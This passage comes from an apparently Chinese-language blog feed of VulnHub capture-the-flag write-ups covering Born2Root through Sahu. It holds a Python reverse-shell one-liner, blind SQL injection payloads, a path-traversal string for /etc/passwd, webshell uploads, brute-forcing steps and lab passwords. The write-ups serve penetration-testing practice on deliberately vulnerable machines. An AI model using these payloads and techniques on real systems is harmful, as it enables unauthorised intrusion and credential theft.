socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.5.104\u0026#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-i\u0026#34;]);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe212692feb11cec236b7b3330307807bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现SUID权限程序：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE94e264ca953699e363b42570e8725b55image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是使用了绝对路径，相关文件没有权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb2f5d8b89510e579bc0e9344a36bd0faimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后面无奈看了WP，结果还是爆破，当初直接爆破会不会更好呢，不同的是，这次cewl的密码本不太够了。实测john生成的不太好用，规则太死了：\u003c/p\u003e\n\u003cp\u003e需要生成特定的社工字典：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.bugku.com/mima/\"\u003ehttps://www.bugku.com/mima/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfcff4143ec5542e6d7d585d15b533b43image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后爆破成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc7c9bf37e31fa4bd34ce742a8c2776c1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这也是root密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE94a07ea7c2aea512e552e831322422e5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x046 Born2Root"},{"content":"这台也是用virtualbox打开的\n端口扫描 渗透 挨个端口来看吧：\n首先是80：\n疑似线索：\ntumblr_mdeo27ZZjB1r6pf3eo1_500.gif\nlogin.php存在sql注入，但是这种登录框一般是盲注，这里是布尔盲注，手动可能有点麻烦：\n443：\n发现wordpress了，先搞wordpress：\n插件：\n用户：\n通过插件查找漏洞，找到两个可能的：\n8080端口：\n只有80端口可以，看样子得写脚本了：\n写了半天，发现没有burp好使：\n测数据库长度： payload:\nadmin \u0026lsquo;or length(database())=5#\n数据库长度为5\n测试数据库名：LOGIN substr(database(),1,1)=‘a’\n第一个字符：L\nadmin \u0026lsquo;or substr(database(),1,1)=\u0026lsquo;L\u0026rsquo;#\nburp操作如下：\n第二个字符：O\nadmin \u0026lsquo;or substr(database(),2,1)=\u0026lsquo;O\u0026rsquo;#\n第三个字符：G\n第四个字符：I\n第五个字符：N\n测试表数量 (select COUNT(*) from information_schema.tables where table_schema=\u0026lsquo;login\u0026rsquo;)=2\n测第一张名的长度 length(substr((select table_name from information_schema.tables where table_schema=\u0026lsquo;login\u0026rsquo; limit 0,1),1))=9#\n第一张表长度9：\n第二张表长度5：\nlength(substr((select table_name from information_schema.tables where table_schema=\u0026lsquo;login\u0026rsquo; limit 1,1),1))=5#\n前面发现一个问题，使用字符串进行对比可能导致大小写的问题\nascii(substr((select table_name from information_schema.tables where table_schema=\u0026lsquo;login\u0026rsquo; limit 0,1),1,1))\u0026gt;97\n算了，我废了，我只能被迫用sqlmap了，找个时间我再写个脚本吧：\nSuperSecretPassword | admin\n进入后台，改php文件反弹shell:\n提权 root密码和上面的一样：\nSuperSecretPassword\n稍后研究一下布尔盲注的脚本：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x047-freshly/","summary":"\u003cp\u003e这台也是用virtualbox打开的\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEddd932a1de8a3abffb95ac78f639055cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE455c2009ebbeffef0badbc63c9e411beimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb5a225c51f1475c5571571ef168b0a0eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e挨个端口来看吧：\u003c/p\u003e\n\u003cp\u003e首先是80：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaf2dc3f875e6e0852684635749191dedimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe9d96b041bbbd8fa1adecf204148e71bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE426dfb4b221c8e7b5c4e260fb022913bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e疑似线索：\u003c/p\u003e\n\u003cp\u003etumblr_mdeo27ZZjB1r6pf3eo1_500.gif\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE85c909c522338f864d15ae38a341ae82image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003elogin.php存在sql注入，但是这种登录框一般是盲注，这里是布尔盲注，手动可能有点麻烦：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9b8cdf0b7df9ffa9511a62a4c8558651image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e443：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa69a016e339c23c326b63476710628faimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现wordpress了，先搞wordpress：\u003c/p\u003e\n\u003cp\u003e插件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE24a07bb38b6177f4fe49dab52897ee52image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8d0f76c1ef4f65a026bd8ebfed16a635image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过插件查找漏洞，找到两个可能的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa8cb12327af8643e93b29ea6926053c1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE37012679a35cd23b7d013b952dd2e1afimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e8080端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE72cdc318574904d05094929963e64f8bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc8526fe0902d1c5354cb480e2e84757bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcc07cb0b3e0f442396c7e0ae50303ae0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e只有80端口可以，看样子得写脚本了：\u003c/p\u003e\n\u003cp\u003e写了半天，发现没有burp好使：\u003c/p\u003e\n\u003ch1 id=\"测数据库长度\"\u003e测数据库长度：\u003c/h1\u003e\n\u003cp\u003epayload:\u003c/p\u003e\n\u003cp\u003eadmin \u0026lsquo;or length(database())=5#\u003c/p\u003e\n\u003cp\u003e数据库长度为5\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9451203a7dfb7dc8998c34dbad310911image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2b1000252161856330d936f4f255af90image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"测试数据库名login\"\u003e测试数据库名：LOGIN\u003c/h1\u003e\n\u003cp\u003esubstr(database(),1,1)=‘a’\u003c/p\u003e\n\u003cp\u003e第一个字符：L\u003c/p\u003e\n\u003cp\u003eadmin \u0026lsquo;or substr(database(),1,1)=\u0026lsquo;L\u0026rsquo;#\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9813f255e2682c0eded417d6e2a253f1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eburp操作如下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcc860519618c0c130e98d2759b9f8dfaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE07604d6e128d798f6982a360439ec7b3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x047 Freshly"},{"content":"端口扫描 渗透 改一下hosts文件：\nwpscan扫描\n插件\n用户\n直接使用rockyou爆破得到密码：\nUsername: loly, Password: fernando\n后台上传webshell，找了老半天了：\n路径：\n提权 提权到loly失败：\n通过查找网站的数据库密码，切换成功：\nlolyisabeautifulgirl\n本来是不想用内核提权的，找了半天好像没其他方式了：\nCVE-2017-16995\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x048-loly/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEde1e61c7e57f09e815a0032c0fd11d67image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7b53bb254eede2f1784e84384fdf8712image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc324ca6592b23308ee422700e12de567image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa9e28aad8a73bd4a43a09e041ad35a13image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e改一下hosts文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE221fda2b20a603f6d2d3ba7f4c22d8acimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ewpscan扫描\u003c/p\u003e\n\u003cp\u003e插件\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEaa966ed8ab637209797eb0e8ee19f739image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用户\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8dcf8b474e296f3bc5948b612fdcac19image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e直接使用rockyou爆破得到密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5de246a980baef1a1b26d104c7d5f97dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eUsername: loly, Password: fernando\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8d9b91ad2b3508092f2ad26524fea912image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后台上传webshell，找了老半天了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE865fd551d6713d868094379641d808b9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e路径：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2fc2369393c45aad527cabafcf38d948image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9b6a05899fa1153cf3f5a4ec96673bc2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e提权到loly失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9f02128b5d446631dcb1e826333b02b0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过查找网站的数据库密码，切换成功：\u003c/p\u003e\n\u003cp\u003elolyisabeautifulgirl\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3c52bc16c4a066df46d18c84d41cc3c7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e本来是不想用内核提权的，找了半天好像没其他方式了：\u003c/p\u003e\n\u003cp\u003eCVE-2017-16995\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEed0a4d73351cb75a592ac4e1e4cf0f5dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x048 Loly"},{"content":"端口扫描 渗透 所有端口都看了一下，几乎都是这个样子，还怪好看的嘞，但是下下来看了一下，没有发现什么隐藏信息：\n21端口：\n这样的话，就只剩一个22端口了，尝试爆破，由于啥信息都没有，就只能试试geisha了：\n大概跑了10多分钟，爆破出了密码为letmein\n提权 查看root密码：\n爆破hash:\n跑了20分钟了，都没跑成功：\n忘了能读密钥啊：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x049-geisha/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5860bad91663e99cb75a73250cbd9ddeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEca0ecaa1b593036f264e606d18221da2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e所有端口都看了一下，几乎都是这个样子，还怪好看的嘞，但是下下来看了一下，没有发现什么隐藏信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcf8e03c3798527180fff0c8870acc214image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e21端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE487a3c6dc3e1865339a426200dc02287image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这样的话，就只剩一个22端口了，尝试爆破，由于啥信息都没有，就只能试试geisha了：\u003c/p\u003e\n\u003cp\u003e大概跑了10多分钟，爆破出了密码为letmein\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE45b536b1f16ee673da74c6911c8a31e1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE10b59b205779b708a9081d153a3bec3bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看root密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE71a02329d5b92176037fa5f55dee1944image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e爆破hash:\u003c/p\u003e\n\u003cp\u003e跑了20分钟了，都没跑成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE531f8eb5ea361cad7b07d629643e2ee2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e忘了能读密钥啊：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdce7b64c708086c6cb8be8ad654659b6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2d19f2a8cb2e5cb094cc083d56f8988cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x049 Geisha"},{"content":"端口扫描 渗透 80端口看看吧：\n对发现的目录挨个访问，发现可能利用的目标：\n通过日志写进去后，读取出现了错误：\n发现一个API，试了路径，暂时不知道什么意思：\n4395874598yt3r9iy98r7r90t87treterrrrr\n还有一个：\n发现了文件包含：\n../../../../../../../etc/passwd\n/var/www/html/\n呐其实我就开始琢磨包含刚刚写的webshell了：\n试了半天，包含不上去，暂时不清楚是什么原因，待会儿看看代码：\n下策，ssh 爆破:\n得到账号密码，时间巨长，建议挂着\ntrevor：qwertyuiop[]\n提权 sudo 提权\n这个日志确实是可以getshell的，但是日志数量多了后面可能就会出现问题，可能是闭合的问题\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x050-devrandom-ctf-1.1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2ac6cee533010f128468f11e3f047d60image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEee81955c2be115c056ffb645efbaa2f7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa6f9ba35d3d592fb76e7d213ad6dfc11image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e80端口看看吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0accb3df785170efd2f1361544b6ce22image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE64fb3a61efdadf803006f933c9a107f5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e对发现的目录挨个访问，发现可能利用的目标：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE32b097cc210fb1209978ee56e2d0d666image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过日志写进去后，读取出现了错误：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE81592191b1ef6f48cf356dd87a243695%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现一个API，试了路径，暂时不知道什么意思：\u003c/p\u003e\n\u003cp\u003e4395874598yt3r9iy98r7r90t87treterrrrr\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc21072bdcee72d3f094679eb5c5faadf%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e还有一个：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcaef03ec16a22d30f5ffb75729f45ea6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现了文件包含：\u003c/p\u003e\n\u003cp\u003e../../../../../../../etc/passwd\u003c/p\u003e\n\u003cp\u003e/var/www/html/\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb8fe1a6296bc4e6f0c458dc5038426f4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e呐其实我就开始琢磨包含刚刚写的webshell了：\u003c/p\u003e\n\u003cp\u003e试了半天，包含不上去，暂时不清楚是什么原因，待会儿看看代码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa41c10150b2d4011fe0f478f00990458%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e下策，ssh 爆破:\u003c/p\u003e\n\u003cp\u003e得到账号密码，时间巨长，建议挂着\u003c/p\u003e\n\u003cp\u003etrevor：qwertyuiop[]\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd8a43cc8fe3cad9c156dba9744ddfb7b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003esudo 提权\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc4b3afe566408dcb9b2445f33c9cd84d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc7d63f8f9599b785e86fc65c203bd5c1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个日志确实是可以getshell的，但是日志数量多了后面可能就会出现问题，可能是闭合的问题\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEea81bbe41588835b92673a1b1aa822f7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x050 DevRandom CTF 1.1"},{"content":"端口扫描 渗透 有匿名登录\n有加密：\n不知道为啥不让破解：\n尝试使用hashcat:\n处理一下hash:\n查询hash编号：\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\n爆破，还是失败了：\nsmb，无果：\n只剩下80了：\n开局只有一个目录，经过一堆扫描：\n看到了这样一个页面：\nhttp://192.168.5.104/H/A/R/Y/A/N/A/\n收集密码：\n爆破：\n但是爆破了半天没有结果，再看看：\n试过了，这不是zip的密码，又几经波折，找到了首页的图片，这个图片有没有可能隐藏信息：\n拿到信息，提示让我们补全后两位：\n只能生成字典了，这里需要学习Crunch工具的使用方法：\nhttps://blog.csdn.net/qq_63844103/article/details/127979575\n大概就是，数字，字符，大小写字母的组合\n这次就爆破成功了：\n发现内容：\n试密码：\n看名字是个ftp的，结果是个smb的：\n提权 看了一下history：\n秒了：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x051-sahu-1.1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf94a020f66ecab1a811342b6fffc24df%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7e14a01b52fb8b9e14f8d0131b978621%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEda50d08dca22bbfa04f8f85d9a4d790e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e有匿名登录\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEef35079603452e67f51ebacfd197e309%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e有加密：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc9bd88e70889c729cc3ab307fa1304ae%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e不知道为啥不让破解：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5ae1b04367cba1de2add1854ac945d15%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e尝试使用hashcat:\u003c/p\u003e\n\u003cp\u003e处理一下hash:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1540de3bfdbef036e7801c04a531b5e9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查询hash编号：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\"\u003ehttps://hashcat.net/wiki/doku.php?id=example_hashes\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc545993ea74c81eac785f719b1917f8b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e爆破，还是失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2c5b0a347f670702f1f76520fa3bdc93%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esmb，无果：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc200a606b302f09adcc0018163f665cb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e只剩下80了：\u003c/p\u003e\n\u003cp\u003e开局只有一个目录，经过一堆扫描：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE33e0536f3537544a9349dbe13dff2e51%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看到了这样一个页面：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"http://192.168.5.104/H/A/R/Y/A/N/A/\"\u003ehttp://192.168.5.104/H/A/R/Y/A/N/A/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcbed0c2b036ff37ceaa0bf21e783f6d6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e收集密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE13ce0262964ef3185e4f3ae0dceaba37%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e爆破：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4d5ce408b46dce1fb67fe145243946a1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是爆破了半天没有结果，再看看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5eeb223f6f3ba2709a8a21c2fc9bc45c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e试过了，这不是zip的密码，又几经波折，找到了首页的图片，这个图片有没有可能隐藏信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcc5fc75b74982bb66e31999358814f44%e6%88%aa%e5%9b%be.png\" alt=\"\"  